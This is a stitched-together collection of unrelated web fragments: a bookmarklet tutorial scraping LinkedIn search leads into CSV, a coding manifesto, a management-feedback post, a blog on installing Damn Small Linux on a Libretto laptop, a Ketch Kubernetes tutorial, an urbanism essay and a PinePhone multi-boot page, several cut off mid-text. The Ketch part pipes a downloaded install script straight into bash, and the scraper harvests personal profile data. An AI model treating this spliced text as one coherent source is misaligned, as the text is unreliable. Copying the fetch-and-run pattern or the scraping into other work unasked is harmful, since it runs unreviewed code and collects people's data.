          Chrome and Firefox with very large urls (over 40,000 characters) and both worked as intended. However, it is probably a good
          idea to go with the general consensus unless you have a good reason not to.
        </p>

        <h2>Pattern 2: Local Data Extraction (LinkedIn Search Result Scraper)</h2>

        <p>
          The data extraction example above extracted simple information from a web page and transferred it to another domain via a new tab.
          Another common variation of the pattern involves locally downloading data instead of transferring the data to a new location.
        </p>

        <p>
          To demonstrate this I created a bookmarklet that scrapes leads from a LinkedIn search results page and downloads the leads in a CSV file
          for local processing.
        </p>

        <p>The complete code can be seen below:</p>

        <pre><code>(function () {
  var links = document.querySelectorAll('a[data-control-name="search_srp_result"]');

  if (links.length === 0) return;

  function escape(s) {
    return '"' +  s.replace('"', '""') + '"';
  }

  function download(data) {
    var blob = new Blob([data], {type: 'text/csv'}),
        e    = document.createEvent('MouseEvents'),
        a    = document.createElement('a')

    a.download = 'data.csv';
    a.href = window.URL.createObjectURL(blob)
    a.dataset.downloadurl =  ['text/csv', …</code></pre></article></div>

<p>We use software for our everyday needs because we want to get something done. We have goals to achieve and things to do.</p>
<p>The software we use is coded by brave programmers that have their own goals. Most of the time there is an overlap between their goals and ours.</p>
<p>Over time these will diverge.</p>
<p>This means that the tools we depend on grow features we don't use or understand. There will be bugs in these code parts which will prevent us from reaching our goals.</p>
<p>So we are at a fork in the road:</p>
<ul>
<li>We have the choice of trying to understand the code and fix it.</li>
<li>We have the choice of trying another program, whose creator's goals are closer to ours.</li>
<li>We also have the choice of coding the software ourself.</li></ul>
<p>All but the last path mean endless seeking, evaluating and further deviation from our goals. Therefore we replace programs we do not understand fully with our own implementation.</p>
<p>The followers of the Code It Yourself Manifesto believe in these things:</p>
<ul>
<li>We implement it according to our own goals.</li>
<li>We make mistakes and learn from them.</li>
<li>We learn how our tools we depend on need to work.</li>

<p>The book <a href="https://www.goodreads.com/book/show/27316166-the-effective-manager">The Effective Manager</a> says you only need 5 to 15 seconds to deliver effective feedback. Here are the 4 steps:</p>



<ol><li>Ask (“Can I give you some feedback?”)</li><li>State the behavior (“When you X…”)</li><li>State the impact (“…the result is Y.”)</li><li>Encourage effective future behavior (“Keep it up!” for positive feedback or “Can you change that?” for negative feedback)</li></ol>



<p>Those steps should be followed whether you’re giving positive or negative feedback. </p>



<p>Here’s an example, pasted from the book:</p>



<blockquote><p><strong>Manager</strong>: Can I give you some feedback?<br><strong>Direct</strong>: Sure, boss.<br><strong>Manager</strong>: When you tell my boss bad news before me, even with the best of intentions, I end up getting in a lot of trouble for not knowing before he did. Can you try to tell me first, going forward?</p></blockquote>



<p>Boom, done in seconds. (And if you’re thinking “but it’ll take much longer when you account for the inevitable debate about what actually happened!” then there’s <a href="https://critter.blog/2020/11/27/future-focused-feedback/">an answer for that too</a>.)</p>



<p>The beautiful thing about this rapid feedback is the frequency that it allows. When it only takes a few seconds, why not give feedback every day? Why not 5 times a day? It lowers the threshold of what is worthy of feedback.</p>



<p>One caveat: the book has a 3 question test you have to ask yourself before you can deliver the feedback:</p>



<ol><li>Are you angry? If so, <em>don’t give the feedback</em>.</li><li>Are you focused on the past instead of the future (i.e., reminding them about something they did wrong or punishing them)? If so, <em>don’t give the feedback</em>.</li><li>Are you able to let it go? If not, <em>don’t give the feedback</em>. In other words, if you can’t let it go in terms of how you feel, you <em>should</em> let it go by not giving negative feedback. If you feel an urge to deliver feedback, you’re probably doing it for the wrong reasons.</li></ol>



<blockquote><p>If you’re not angry, if it’s not about the past or about punishment, and if you can let it go, then go ahead and give the feedback.</p></blockquote>



<p>There you have it. 5 second feedback. Lower the threshold for what’s feedback-worthy and delivery a steady stream of rapid feedback every day.</p>

Damn Small Linux on a Libretto 50CT
</a></h3>
<!-- bashblog_timestamp: #202011241930.05# -->
<p>November 24, 2020 — 
Carlos Fenollosa
</p>
<!-- text begin -->

<p>In about 2004 a friend from college got into his hands a series of
<a href="https://download.milesburton.com/Libretto/Datasheets/libretto_50_e.pdf">Toshiba Libretto 50CT</a>.
They all came with Windows 95 pre installed, and we wiped them out
and installed Debian with a 2.2 kernel from floppies, with much pain because of
the unsupported disk drive. I remember it being so difficult that I
don't even want to write about it. But it booted and was able to
run Vim, Links, and connect to the internet. Enough for a
network-enabled typewriter.</p>

<p>I got Richard Stallman to sign mine while it was running GNU/Linux,
but when I bought a regular laptop I stopped using it because,
well, it is too old, and its keyboard is too tiny to type
comfortably with it.</p>

<p><a href="https://cfenollosa.com/blog/img/libretto_closed.jpg"><img src="https://cfenollosa.com/blog/img/libretto_closed.thumb.jpg" alt="The Libretto, closed" title=""></a></p>

<p>The Libretto, closed. It is a tiny machine, a wonderful piece of
engineering.</p>

<p>Around 2012 I found it inside a box at home, working
perfectly, with a battery life of a bit less than an hour—which is incredible for
a 12+ year old machine— and
<a href="http://en.wikipedia.org/wiki/DR-DOS">DR-DOS</a> installed. I can't
remember why I did that, but
<a href="http://en.wikipedia.org/wiki/Golden_Axe">Golden Axe</a> was also
installed, so there's a hint.</p>

<p>I decided to install a modern Linux and, at least, store it on a
working condition to give some justice to Stallman's signature.</p>

<p>There are some tutorials available on the net, but none of them
covered 100% of the hardware support for my machine. Most of them
are also outdated, and refer to distributions that don't exist,
don't have any support or are about unusable nowadays. However, I
took many hints from those tutorials, and I will reference them
accordingly.</p>

<h4>Hardware</h4>

<p>This laptop has a 75 MHz —actually, mine reports 74 MHz— with
<strong>24</strong> MB of RAM, which is an upgrade from the original 16 MB which
are usually bundled. The screen is 640x480, and if you choose a
higher resolution, instead of scaling the image, it only displays
the upper-leftmost 640x480 pixels, leaving the bottom and rightmost
part of the area out of sight.</p>

<p>The mouse device is emulated as a PS/2, and physically is a
"clitoris"-like pointing device. You know what I mean. 
Working with the X windows is a pain in the neck because the
location of the mouse and buttons isn't very ergonomic, and clicking on a button makes
the whole screen move on its hinges. </p>

<p>Next to the mouse there is a
speaker which is similar in quality to those of a modern
smartphone.</p>

<p>This device doesn't have any extension port other than a dock
connector for a dock I don't have, and a 16-bit PCMCIA slot, which
you will need for the network card. It doesn't have a COM port or
anything like that, which is understandable, given the size of the
case.</p>

<p>It does have an Infrared device, which is quite slow and useless,
but for its time it was as good as wireless could get. The other
holes correspond to the power adapter and the reset button next to
the PCMCIA, big enough to be able to reset the laptop with a
regular pen.</p>

<p>For the full specifications, please refer to
<a href="https://download.milesburton.com/Libretto/Datasheets/libretto_50_e.pdf">the official leaflet</a>.</p>

<p><a href="https://cfenollosa.com/blog/img/libretto.jpg"><img src="https://cfenollosa.com/blog/img/libretto.thumb.jpg" alt="The Libretto" title=""></a></p>

<p>The setup I will be using: the Libretto, and a 3Com 16-bit PCMCIA
Ethernet card</p>

<h4>Choosing a Linux distribution</h4>

<p>I wanted to find some modern, low-demanding software, not
unsupported versions of Debian or RedHat. As you might have
expected by this page's title, I chose
<a href="http://www.damnsmalllinux.org/">Damn Small Linux</a> (DSL).</p>

<p>I was very lucky to find that my machine had been upgraded to 24 MB
of RAM. Apparently, even low-end distros have difficulties booting
a regular kernel with 16 MB. I didn't want to tune or recompile the
kernel on a 75-MHz machine, so I had to do some tricks.</p>

<p>In order to decide on a distro, I tried to set some goals up:</p>

<ol>
<li>Discard modern distributions which require at least 256 MB of
RAM. In fact, discard anything that doesn't work with 24 MB of RAM</li>
<li>Try to avoid old versions of current distros (i.e. Debian
Woody) because the ISOs and the packages might not be mirrored
anymore and are difficult to be found.</li>
<li>Use a distro which self-configures kernel modules on boot,
because I will be installing from a Virtual Machine and the
hardware will change between reboots. Recompiling the kernel is
totally out of the picture.</li>
<li>Kernel 2.4 if possible, to make both the audio and the Ethernet
work</li>
<li>As easy to configure as possible. I want to finish this in a
few hours... [Narrator: he didn't]</li>
</ol>

<p>I found myself with these contenders,
<a href="http://www.damnsmalllinux.org/">Damn Small Linux</a>,
<a href="http://puppylinux.org/">Puppy Linux</a> and
<a href="http://distro.ibiblio.org/tinycorelinux/welcome.html">Tiny Core Linux</a>.</p>

<p>DSL v4 was the chosen one for many reasons. First, the default
software choice is a good compromise and finely tuned for
low performing machines. The installation seemed the easiest
of the three, and—very important—worked flawlessly inside
VirtualBox. The documentation is very extensive and, as a slightly
old distro, there are lots of manuals and forum posts with
solutions to common problems.</p>

<p>There is also the fact that DSL is based on Knoppix, so it detected
my hardware perfectly, didn't have to tweak the PCMCIA, and only
had to configure the audio manually because the I/O ports were not
the standard ones. This was a huge aid for me. PCMCIA Internet
working out of the box is something I hadn't even imagined to
have.</p>

<p>However, the decision also came with a few drawbacks. DSL has its
own "package manager", which only works from X and can't uninstall
packages. </p>

<p><code>apt-get</code> can be enabled, but it might break packages already installed with MyDSL.
Furthermore, those packages tend to disappear on a reboot for some reason. I'm
still unsure on whether to use apt-get with MyDSL. We will not be using it.</p>

<p>The ACPI doesn't work, but I don't know whether it's the kernel or the Libretto's
fault.</p>

<p>My biggest fear, however, is that most of the packages are old and
might have security issues. However, as this will not be my main
machine, and it won't run a browser with JavaScript enabled, I'm
not very worried.</p>

<p><strong>Why didn't I choose Tiny Core?</strong> because it didn't boot on a
VirtualBox machine with 24 MB of RAM. It would have been my first
choice, because it is better maintained than DSL. A real pity.</p>

<p><strong>And what about Puppy?</strong> The LiveCD is great but the installation
instructions were too complicated for me. I really didn't want to
spend that much time configuring everything. It is maybe too modern
(based on Slackware 13.37 with Kernel 3.1.10) and I doubt the
Libretto could have handled its kernel.</p>

<h4>Installation</h4>

<p><em>Please note: I will assume that you have some experience with Linux, partitioning, and installing stuff from a console.</em></p>

<p><strong>Strategy</strong></p>

<p>There are two alternatives: use floppy disks or physically remove
the drive and set up a VM. Years ago, I went the first path,
because I had the floppy disk drive. Since I don't have it
anymore, I found
<a href="http://davissharonforest.tripod.com/DebianLinux31onToshibaLibretto50.htm">an awesome tutorial</a>
which suggested to physically remove the drive from the Libretto,
attach it to a 2.5" IDE to USB adaptor, and install the system from
another computer. Check out his pictures for details on how to
remove the drive. My machine is in a bad condition
(broken hinges, cracks all over the case, stuck screws) and I had
to break some plastics and metal parts to access the drive.</p>

<p>So, we will use another Linux computer, which you probably already
have, and set up a virtual machine inside VirtualBox. Then, we will
remove the Libretto's physical HDD and attach it via USB to your
computer, using an adapter. The DSL CD image and the new /dev/sd
will be mapped inside the VM.</p>

<p>This way we can boot and install from a CD, instead of doing
netinsts with the Debian Woody diskettes, as you will read on many
other websites. It is the fastest and painless way, and if you
don't have the floppy drive, it is the only way.</p>

<p>If you have the floppy drive and are wondering if it is worth to
buy the adapter, go ahead! Walk the
difficult path, install DOS, start a Linux setup from DOS, try to
make the floppy disk work, then install from diskettes with a
crappy kernel, fight with the PCMCIA driver until you are able to
use the network, and install from the net. And, should the
installation fail, start OVER AGAIN! When this happens, please send
me an email so that I can pretend that I sympathize with you but
actually laugh at your misery.</p>

<p>Talking seriously, I am just trying to warn you.
I tried that, I failed, then I succeeded, and not even in my
success I want even the worst of my enemies going that path. Buy it, 
then come back and follow these instructions.</p>

<p><strong>Removing the hard drive</strong></p>

<p>You already have the adapter? Great! I bought
this one which worked great and allowed me to manipulate the drive from my
main computer.</p>

<p><a href="https://cfenollosa.com/blog/img/ide_adapter_box.jpg"><img src="https://cfenollosa.com/blog/img/ide_adapter_box.thumb.jpg" alt="The 2.5inch IDE to USB adapter" title=""></a></p>

<p>This is the adapter in its box. It comes with an enclosure that I
didn't use to avoid overheating, and a handy screwdriver.</p>

<p><a href="https://cfenollosa.com/blog/img/ide_adapter.jpg"><img src="https://cfenollosa.com/blog/img/ide_adapter.thumb.jpg" alt="The 2.5inch IDE to USB adapter, close up" title=""></a></p>

<p>A close up of the IDE adapter. Don't buy a SATA one by mistake!</p>

<p><strong>Using the drive in VirtualBox</strong></p>

<p>As stated before, we will use VirtualBox to make DSL think it is
running on a real machine, and that the—now USB— hard drive is the
main drive of the VM. Turns out that using a physical disk from <code>/dev</code> on
VirtualBox isn't easy to find, but the actual command is simmple.</p>

<p><strong>Please make sure that your Linux has detected the USB drive as <code>/dev/sdb</code> before proceeding or you might lose data on the wrong disk!</strong>
If in case, use Disk Utility or check dmesg.</p>

<pre>VBoxManage internalcommands createrawvmdk -filename disk.vmdk -rawdisk /dev/sdb
                                                                       ^^^^^^^^  &lt;-- check this
</pre>

<p>The command above will create a file named disk.vmdk, which is a
short plaintext file which references to <code>/dev/sdb</code>. You can now add
it to your VM using the normal VirtualBox Appliance Manager</p>

<p><strong>Partitioning</strong></p>

<p>Use your main Linux box to partition the hard drive. Disk Utility
works well, but I used cfdisk.</p>

<p>The tutorial then notes that the last 32MB of the disk space are
used for the Libretto's hardware Hibernate feature. I followed his
partition table suggestions completely. Just in case his page is
down, do this:</p>

<ul>
<li><code>/dev/hda1</code> 738.0 MB, <code>ext2</code> (ext3 is slower, but more secure),
mounted as <code>/</code></li>
<li><code>/dev/hda2</code> 40.3 MB, <code>swap</code></li>
<li>A remaining free space of 37.2 MB. Don't worry if the figure is
slightly higher or lower due to rounding.</li>
</ul>

  Introduction
</h2>


<p>Ketch is a very new open source <a href="https://theketch.io/">project by Shipa</a> that shares a similar concept with the Shipa DNA.</p>

<p>Ketch is heavily focused on easing out application deployments for developers, aiming for a situation where a developer does not have to write any YAML configuration files, and can directly deploy their application on any Kubernetes cluster.</p>

<p>In this post we will go through Ketch Concepts and then deploy an application to a <a href="https://www.civo.com/kube100/">managed k3s cluster on Civo</a>.</p>

<p>The official definition of Ketch from Shipa is "an application delivery framework that facilitates the deployment and management of applications on Kubernetes using a simple command line interface. No YAML required!"</p>

<p>This simply means that you can deploy applications onto any Kubernetes cluster by just using the Ketch CLI. But there is much more!</p>

<p>Kubernetes has become the de facto standard for deploying microservices and containerized applications, but there is a learning curve for a developer to get familiar with Kubernetes concepts, Kubernetes objects, how to write the required YAML files, and then how to create and manage them. These issues are there for any organization, big or small, as Kubernetes itself is complex and requires a lot of  knowledge to get up and running. Ketch works toward solving these issues by eliminating the need for writing YAML files and directly deploying applications onto a cluster.</p>

  Architecture
</h2>


<center><img src="https://civo-com-assets.ams3.digitaloceanspaces.com/content_images/1061.blog.png?1606373643" alt="Ketch architecture"></center>

<p>The above image is from the <a href="https://learn.theketch.io/docs/architecture">Ketch documentation</a>, and displays the architecture overview. Inside our cluster, we have a Ketch Controller, custom resource definitions (CRD) for the Pool and App, and an Ingress controller.</p>

<p><strong>Pool CRD</strong> - It's basically used to isolate different applications deployed. Each pool created will configure a namespace and other components onto the cluster.</p>

<p><strong>App CRD</strong> - Provides App context to applications and is responsible for running the application and managing its lifecycle.</p>

<p><strong>Ketch Controller</strong> - Monitors the changes that happen in the Pool and App CRDs. Ketch can also create a complete Helm chart for the application which can be used in different ways.</p>

<p><strong>Ingress Controllers</strong> - As of the writing of this guide, Ketch supports Traefik and Istio.</p>

<h2 id="prerequisites">
  <a href="#prerequisites"><i></i></a>
  Prerequisites
</h2>


<ul>
<li>A Kubernetes cluster you control. We'll take advantage of <a href="https://www.civo.com/kube100">Civo's super-fast managed k3s service</a> to experiment with this quickly. If you don't yet have an account, sign up to the beta now to take advantage of quick deploy times and $70 free credit per month! Alternatively, you could also use any other Kubernetes cluster.</li>
<li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">kubectl installed</a>, and the <code>kubeconfig</code> file for your cluster downloaded.</li>
</ul>

<center><img src="https://civo-com-assets.ams3.digitaloceanspaces.com/content_images/1020.blog.png?1604672061" alt="Civo Kubernetes configuration"></center>

<p>Make sure you can connect to your Kubernetes cluster by running</p>

<pre><code>kubectl get nodes
</code></pre>

<p>You should see the names of the nodes in your cluster displayed.</p>

  Getting up and running with Ketch
</h2>


<h3 id="installing-ketch">
  <a href="#installing-ketch"><i></i></a>
  Installing Ketch
</h3>


<p>First the Ketch Binary has to be downloaded in order to deploy the application to our Kubernetes cluster. In this case I am installing Ketch CLI on my Mac:</p>

<pre><code>$ curl -s https://raw.githubusercontent.com/shipa-corp/ketch/main/install.sh | bash

Downloading Ketch binary from https://github.com/shipa-corp/ketch/releases/download/v0.1.0/ketch-darwin-amd64 to /usr/local/bin/ketch
Ketch client installation was successful

$ ketch -v
ketch version 0.1.0
</code></pre>

<h3 id="ingress-controller">
  <a href="#ingress-controller"><i></i></a>
  Ingress controller
</h3>


<p>As of the writing of this guide, Ketch supports two ingress controllers, Traefik and Istio, with a plan to add more in the future. By default k3s comes with Traefik Ingress controller, which you can check using the following commands that show the pods that should include your Traefik pods, as well as the running service to manage traffic:</p>

<pre><code>$ kubectl get pods -A

<p>You can see that Traefik comes pre-installed when you spin up a k3s cluster on Civo, and serves up an external IP address.</p>

<p><strong>Note</strong> - If you are using a different Kubernetes cluster make sure you install Traefik or Istio from <a href="https://github.com/shipa-corp/ketch#install-ingress-controller">here</a>.</p>

<p>Ketch Requires a certificate manager to be installed onto the cluster. This can be installed via the Civo Marketplace, either on the web on your cluster management page, or with <a href="https://www.github.com/civo/cli/">Civo CLI</a>.</p>

<pre><code># Installing cert-manager via civo cli, to our cluster called "ketch"
civo kubernetes applications add cert-manager --cluster=ketch
</code></pre>

<p>If you are using a different or self-hosted Kubernetes cluster, you can install cert-manager by using the below command:</p>

<pre><code>kubectl apply --validate=false -f https://github.com/jetstack/cert-manager/releases/download/v1.0.3/cert-manager.yaml
</code></pre>

<p>Whichever option you choose, check that cert-manager is running:</p>

<pre><code>kubectl get pods -n cert-manager

<p>As we have seen in the Architecture section, our cluster will need a Ketch Controller that will be creating and watching the Pool CRD and App CRD.</p>

  Creating a Ketch Pool
</h3>


<p>Before deploying an app you need to create a Ketch pool. This is where we will need the external IP address of our ingress. We will get it by checking our Traefik service:</p>

<pre><code>$ kubectl get svc -A | grep traefik
kube-system    traefik-prometheus                         ClusterIP      192.168.219.19    &lt;none&gt;            9100/TCP                     93m
kube-system    traefik                                    LoadBalancer   192.168.145.176   185.136.234.146   80:32596/TCP,443:30706/TCP   93m
</code></pre>

<p>Then, we run <code>ketch pool</code> to add our pool:</p>

<pre><code>$ ketch pool add saiyam  --ingress-service-endpoint 185.136.234.146 --ingress-type traefik
Successfully added!
</code></pre>

<p><strong>Running the above created a new namespace</strong></p>

<pre><code>$ ketch pool list
NAME      STATUS     NAMESPACE       INGRESS TYPE    INGRESS CLASS NAME    CLUSTER ISSUER    APPS
saiyam    Created    ketch-saiyam    traefik                                                 0

$ kubectl get ns | grep saiyam
NAME              STATUS   AGE
ketch-saiyam      Active   20s
</code></pre>

<p>As of now there are 0 apps in the pool, so let's create an application</p>

<pre><code>$ ketch app create hello --pool saiyam

$ ketch app list
NAME     POOL      UNITS    ADDRESSES                                   DESCRIPTION
hello    saiyam    0        http://hello.185.136.234.146.shipa.cloud

$ ketch pool list
NAME      STATUS     NAMESPACE       INGRESS TYPE    INGRESS CLASS NAME    CLUSTER ISSUER    APPS
saiyam    Created    ketch-saiyam    traefik                                                 1
</code></pre>

<p>You can see that the App has 0 units as we have not deployed any app but just by creating the app, it created the endpoint automatically.</p>

<p>Now let's actually deploy an image onto the k3s cluster.</p>

<pre><code>$ ketch app deploy demo -i docker.io/saiyam911/ketch-demo
Successfully deployed!

$ ketch app list
NAME    POOL      UNITS    ADDRESSES                                  DESCRIPTION
demo    saiyam    1        http://demo.185.136.234.146.shipa.cloud
</code></pre>

<p>The application has been deployed successfully from the image provided. If we visit the address provided by the <code>ketch app list</code> command above, we should see the following:</p>

<p>Behind the scenes, Ketch has created a deployment and other Kubernetes objects to expose the application. Additionally, Ketch can export your application as a helm chart which can be used to distribute your application. This is a really cool feature in my opinion, which will be discussed in more detail below.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	
	
	<img src="https://invisibleup.com/articles/31/thumb.png" alt="All Our Selves In One Basket thumbnail">
	
	

	
<p>There's a classic old idiom, "don't put your eggs all in one basket". The reasoning goes, what if the basket breaks? What if the basket isn't big enough, or gets stolen, or was cursed by a witch or something? It's important to have redundancy, to spread the eggs across many basket so that there's no one single point of failure.</p>
<p>But if we look at society, if we look at the internet, if we look at the communities we've built ourselves around... unfortunately, I believe that's exactly what a lot of us are doing. Being able to be yourself, being able to choose how you present yourself to the world, being able to tailor your living environment to your needs and desires? That's all very, very important. But if you give the keys to your self-expression and the options for the communities you belong in to one small, largely unknown group of people, that's not good.</p>
<p>In this ludicrously in-depth article, we'll be discussing how society limits both individual and community self-expression both online and offline.</p>
<h2>Part 1: The Third Place</h2>
<p><img alt="A house, labeled '1', an office complex, labeled '2', and a '3' with a question mark" src="https://invisibleup.com/articles/31/thirdplace.png"></p>
<p>Very, very broadly speaking, a working-class person (that is, not an "owner" like a CEO, landlord, or investment banker) lives their life in three kinds of places. The first place is home. It's where you sleep, it's where you do your hobbies, it's where you have privacy and family and possibly friends if you want to invite them over. The second place is work, where you do a job to contribute to society and receive wages.</p>
<p>But clearly, we do more than that. We go to other places. Grocery stores and shops, of course, but besides that. The "third place" is where you spend your time in public, in your community. American urban sociologist Ray Oldenburg, who came up with the concept of "the third place" in his 1989 book "The Great Good Place", defines the third place as (commonly seen as) eight characteristics.</p>
<ol>
<li>There is no obligation to be here for legal, survival, political, etc. reasons. You can just <em>not show up</em>.</li>
<li>Everyone is equal. The rich, the poor, the minorities and the majorities all intermingle together in one common space.</li>
<li>Conversation and socializing is the main activity. You go here to "hang out".</li>
<li>They're accessible and accommodating for anyone who wants to visit.</li>
<li>It's a place where people regularly go, and whose regulars give the space its vibe and characteristics.</li>
<li>The physical place is not overly pretentious or imposed. It feels like <em>the community</em>, like an extension of home.</li>
<li>Generally speaking, the vibe here is more calm and friendly and playful than actively hostile and argumentative.</li>
<li>You feel like you have genuine ownership in the place, as if it's almost a communal home for you and the people you care about.</li>
</ol>
<p>That's a relatively high bar, when spelled out like that. In pandemic-era America you'd be very hard pressed to name a place like this. Offline, anyways. But this sort of pattern has shown up a lot in history, because as it turns out people <em>like</em> having a communal space to just vibe in.</p>
<h3>The Town Square</h3>
<p><img alt="The Zócalo in Mexico City" src="https://invisibleup.com/articles/31/zocalo.jpg"></p>
<p>The most obvious example in urban environments is the town square or the plaza. It's an open area in the middle of town, usually with benches and close access to shops and homes and such. Pictured is <em>La Plaza del Zócalo</em>, the main square of Mexico City. It's been a meeting spot for the people of the area since the Aztec times, an important location for numerous historical events, and significant enough to warrant its own Wikipedia page. That's really amazing for a 240 m^2 slab of concrete. What's even more amazing is that it <em>wasn't</em> always a slab of concrete. Here's a model of how it looked in 1910.</p>
<p><img alt="The Zócalo in Mexico City" src="https://invisibleup.com/articles/31/zocalo1910.jpg"></p>
<p>It was a big park area! With a bunch of trees and benches and everything. Unfortunately, the very shaky politics of 20th century Mexico left the area in major disrepair by the 1970s, and it became that. I am not from Mexico, nor do I know anyone from the region, so I can't comment on what that did to the community in Mexico City. But as an outsider, I'd consider the 1910 Zócalo much more friendly and inviting than the modern one, which is literally a flat surface with a flagpole in the middle all surrounded by a busy road.</p>
<p>Obviously that isn't the only example. These tend to be a staple of small European and Hispanic towns. Just, a place, in your neighborhood, to go and chill. Other famous examples include the Roman Forum, the Greek Agoras, the National Mall of Washington D.C, and the "quads" or "diags" of most college campuses.</p>
<h3>Shopping Malls</h3>
<p>It is incredibly worth pointing out that town squares only make sense in urban contexts, where there's a dense population of people who live, work, and shop in one general area. The appeal of town squares is that they're basically on the way to wherever you're going, so it's a really nice spot to meet up with friends or just go if you're bored.</p>
<p>Suburbia is <em>not</em> that. Or, more accurately, it is that, <em>at the scale of the car.</em> See, America's fascination of suburban sprawl has a long detailed history to it. Paraphrasing from (imo) a very good book, "Repairing the American Metropolis: Common Place Revisited" by Douglas S. Kelbaugh, the blame of sprawl can be pinned down largely on cultural reasons. First off, Americans always solved their resource and land division issues by expansion, growth, "moving out west". It was the safety valve to avoid actually thinking about difficult problems. At the time this was seen as the country's "manifest destiny", which eventually led to <a href="https://www.youtube.com/watch?v=FfoQBTPY7gk">unnervingly cheery songs on children's television happily glossing over the genocide of Native Americans like it was no big deal</a>. And, heck, if we got all this elbow room, why not make everything really, really big? Big houses, big rooms, big parcels of land. And really, really cheap too, because of the glutton of natural resources. And sure, that'll get old and worn sometime, but some of the population will leave for greener pastures anyways, so there's no need to change anything.</p>
<p>So, around the early-to-mid 20th century, when cities were getting too full of colored people who were just demanding rights too loudly, most of the rich white people just up and left. They settled suburban areas outside the cities, less densely populated, with all the backyard space you need to cook out with your neighbors. And via <a href="https://en.wikipedia.org/wiki/Redlining">redlining</a>, it was possible to dig very deeply a concrete "us vs. them" line in the dirt. The newfangled highway system just made it easier to separate the houses from the factories, to drive a wedge in the population. Also, just to drive the point home, federal, state, and local governments have subsidized services like sewer pipe connections, energy, and road building, often funded by taxes generated from the more urban, more productive areas.</p>
<p>An incredibly good example of this is to compare Flint and Burton, MI to the surrounding cities of Grand Blanc, Flushing, and Davison. I could spend a lot of time on this but I'd rather just do a visual comparison.</p>
<p><img alt="Fox Hill Glens of Grand Blanc, MI" src="https://invisibleup.com/articles/31/grandblanc.jpg">
<img alt="Section of the Flint River of Flint, MI" src="https://invisibleup.com/articles/31/flintriver.jpg"></p>
<p>It should be laughably easy to tell which one is which. (The first pic is the Fox Hill Glens of Grand Blanc, which was the first image Google gave me. The second pic is a section of the Flint River between downtown Flint and Kettering University. I took that pic during an urbex tour a few years back, because Flint was somewhat nearby and makes for <em>amazing</em> urbex pics.)</p>
<p>Where this starts to cause issues is that instead of having one core neighborhood with residential, commercial, <em>and</em> industrial areas (in a SimCity-esque model), we've split those sections into their own, largely independent areas, often harshly split on racial or class boundaries. We've got gigantic swaths of houses with maybe a corner store and a gas station, we've got giant industrial parks or office complexes, and we've got the commercial districts.</p>
<p>It's the commercial districts I really want to highlight here. If the residential areas are home, and the industrial/office parks are work, then clearly the third place is the commercial district. Now, there's two ways to approach that. </p>
<p><img alt="A strip mall" src="https://invisibleup.com/articles/31/stripmall.jpg"></p>
<p>The most common approach is to just put a bunch of boxes next to each other, surround it with a parking lot, and call it "a strip mall". Occasionally there will also be a "big box" store, like a Wal-Mart or a Target or a Best Buy or a Kohl's or a Home Depot, either attached or detached.</p>
<p>In the very worst scenarios, you're subject to drive through the <a href="https://www.strongtowns.org/journal/2017/10/30/the-stroad">"stroad", or street-road</a>, where all the shops each have their own driveway and their own parking space and it's hostile to both people <em>and</em> cars.</p>
<p>You drive here (or take the bus, if you're poor and you're fine with the once-an-hour service), you shop, you drive home. You don't really spend time here. There is literally nothing here besides concrete boxes. And also the constant issue of cars driving past you. Hope you like sprinting across five lanes of traffic moving at 40 mph!</p>
<p>Enter Austrian-born architect <a href="https://en.wikipedia.org/wiki/Victor_Gruen">Victor Gruen</a>. After fleeing to America from the Nazis, on account of being a Jewish socialist, he slowly worked up the career ladder, from draftsman to architect. And he absolutely saw the issues of suburban sprawl. In the 1950s he gave a speech where he called the suburbs "avenues of horror ... flanked by the greatest collection of vulgarity ... ever collected by mankind."</p>
<p><img alt="The Strand Arcade in Sydney CBD, Australia, opened 1892" src="https://invisibleup.com/articles/31/arcade.jpg"></p>
<p>As an alternative, he envisioned a single building, a few shops surrounded by a shared courtyard, protected from the weather. Something of an iteration of the old "arcades", like the Strand Arcade in Sydney, Australia as pictured above. The courtyard was the most substantial improvement, it was somewhere to go <em>in between</em> shopping. The arcade was just a straight hallway normally, literally just shops in a building. The shopping mall was a <em>destination</em>.</p>
<p>Victor has larger goals in mind. He expected this to be just <em>one</em> part of a new, dense, suburban community. He imagined indoor malls with housing, with schools and libraries and doctor's offices and offices, perhaps surrounded outside by high density housing or other needs. …</p></article></div>

<p>Here you can find a multi-boot uSD card image containing 17 different Pinephone distributions. 
The purpose of this image is for users to <b>easily try current major (and some minor) Pinephone Linux distributions</b>,
without having to figure out how to flash them individually and juggle with many uSD cards.

</p><p>Key points:

</p><ul>
	<li>[Relatively] small 6GiB image containing 17 distributions:
	<ul>
		<li>Arch Linux ARM 2020-11-21
		</li><li>Arch Linux ARM / dreemurrs 20201112
		</li><li>Lune OS 2020-11-23
		</li><li>Maemo Leste 20201101
		</li><li>Manjaro / Phosh beta2-20201119
		</li><li>Manjaro / Plasma 201122
		</li><li>Mobian 20201121
		</li><li>KDE Neon 20201123-084050
		</li><li>pmOS / Plasma Desktop 2020-11-21

		</li><li>pmOS / GNOME 2020-11-21
		</li><li>pmOS / Plasma Mobile 2020-11-21
		</li><li>pmOS / Phosh 2020-11-21
		</li><li>Sailfish 1.1-3.3.0.16-devel-20201101
		</li><li>pmOS / sxmo nightly-202011090018
		</li><li>Ubuntu Touch 2020-11-19
		</li><li>Jumpdrive 0.6
	</li></ul>

	</li><li>Runs my <a href="https://xnux.eu/p-boot">p-boot</a> bootloader and <a href="http://xff.cz/git/linux">my latest kernel</a> (5.10-rc5)
	</li><li>Based on btrfs subvolumes and file level deduplication (if you mess up, you can easily revert each distribution to original state using pre-created btrfs snapshots)
	</li><li>All included distributions work on Braveheart and later Pinephone variants (incl. 3GiB variant), thanks to sharing my kernel and bootloader
	</li><li>My modem power management driver is used on all distributions for safe and reliable handling of modem power (instead of ad-hoc scripts used by original distributions)
	</li><li>Suspend to ram based on the latest crust is available to all distributions (whether they actually use it or not)
	</li><li>The image is made to fit a 16GiB or larger uSD cards, and also works when flashed to eMMC
</li></ul>

<p>Some development history and technical details can be found on <a href="https://xnux.eu/log/">my blog</a>.

</p><p>There are some excellent presentations of the multi-boot image available on youtube:</p>
<ul>

	</li><li><a href="https://www.youtube.com/watch?v=7GjXQFnMHGY">Megi's multi-boot image for the PinePhone (with 17 Linux distros)</a> by Liliputing
</li></ul>

<h2>News</h2>

<h3>2020-11-23</h3>

<ul>
<li>Added more distros (Manjaro, Arch dreemurrs, Jumpdrive, pmOS / plasma desktop). Removed PureOS (doesn't seem to be maintained anymore).
</li><li>All distros updated to the latest versions.
